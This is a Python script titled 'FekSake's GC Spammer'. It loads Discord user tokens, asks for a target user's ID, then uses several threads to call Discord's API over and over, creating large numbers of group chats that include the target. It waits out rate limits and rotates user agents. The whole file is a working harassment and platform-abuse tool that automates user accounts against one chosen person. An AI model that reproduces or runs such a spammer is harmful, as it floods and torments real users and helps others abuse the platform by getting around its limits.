import requests
from art import *
from colorama import Fore
import os
import getpass
import time
import random, json, string
import datetime, threading

def rand_user_agent():
    agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 "
        "Safari/537.36 Edge/12.246",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 "
        "Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.15 Chrome/83.0.4103.122 "
        "Electron/9.3.5 Safari/537.36 "
    ]

    return random.choice(agents)

ascii_art = text2art("GCSpammer", "sub-zero ")
os.system("cls")
os.system("title FekSake's GC Spammer")
print(f"{Fore.MAGENTA}{ascii_art}{Fore.RESET}")


oonefile = open("on.txt","r")
on_t = oonefile.readline()
on_t = int(on_t)

__tokens = []

try:
    file = open("tokens.txt", "r")
    if file.readline() == "tokens-here":
        print(f"{Fore.MAGENTA}Couldnt load tokens from file 'tokens.txt'\nEnter token manually [input hidden]")
        file_loaded = False
    else:
        file_loaded = True
except Exception as e:
    print(f"{Fore.MAGENTA}Couldnt load tokens from file 'tokens.txt'\nEnter token manually [input hidden]")
    file_loaded = False

if file_loaded == False:
    token = str(getpass.getpass(f"{Fore.LIGHTMAGENTA_EX}Token used to spam : {Fore.RESET}"))
    tkin = token[:len(token)//2]
    print(f"{Fore.LIGHTMAGENTA_EX}Token begginging with {tkin}{Fore.RESET}")
    __tokens.append(token)

elif file_loaded == True:
    lines = file.readlines()
    for line in lines:
        __tokens.append(line.strip("\n"))
    print(f"{Fore.MAGENTA}Loaded {len(__tokens)} tokens")

target_id = int(input(f"{Fore.RED}Target ID : {Fore.RESET}"))
amount = int(input(f"{Fore.BLUE}Amount of groups : {Fore.RESET}"))
delay = float(input(f"{Fore.YELLOW}Delay Per group : {Fore.RESET}"))
input(f"{Fore.LIGHTYELLOW_EX} Press [enter] To begin spamming{Fore.RESET}")

headers = {"Authorization" : f"",
           "Content-Type" : "application/json",
           "User-Agent" : f"{rand_user_agent}" }

letters = "qwertyuiopasdfghjklzxcvbnm1234567890QWERTYUIOPASDFGHJKLZXCVBNM"

name = "FekGC"

def start(token):
    global on_t, amount
    try:
        headers = {"Authorization" : f"{token}",
               "Content-Type" : "application/json",
               "User-Agent" : f"{rand_user_agent}" }
        r = requests.get("https://canary.discordapp.com/api/v6/users/@me", headers=headers)
        tokeinfo = r.json()
        owner_id = tokeinfo["id"]
    except Exception as e:
        print(f"Token {__tokens.index(token)+1} Had a error... {e} Exiting")
        return
    for on in range(amount):
        ff = open("on.txt","w")
        r = requests.post('https://discordapp.com/api/v9/users/@me/channels', headers=headers, json={"recipients":[f"{owner_id}", f"{target_id}"]})
        jsonn = r.json()
        if "retry_after" in jsonn:
            retry = int(jsonn["retry_after"])
            now = datetime.datetime.now()
            now_plus_10 = now + datetime.timedelta(seconds=(retry+10))
            print(f"{Fore.RED}[{now.strftime('%H:%M:%S')}] Failed on {on_t} Token {__tokens.index(token)+1} | RATELIMIT waiting {retry+10} seconds... waiting until {now_plus_10.strftime('%H:%M:%S')} {Fore.RESET}")
            time.sleep(retry+10)
            on_t = on_t + 1
            ff.write(f"{on_t}")
            ff.close()
        else:
            print(f"{Fore.GREEN}Token {__tokens.index(token)+1} | Made Group chat {on_t}")
            on_t = on_t + 1
            ff.write(f"{on_t}")
            ff.close()
        time.sleep(delay)


amount = int(amount/len(__tokens))

for token in __tokens:
    threading.Thread(target=start, args=(token,)).start()
    time.sleep(1)
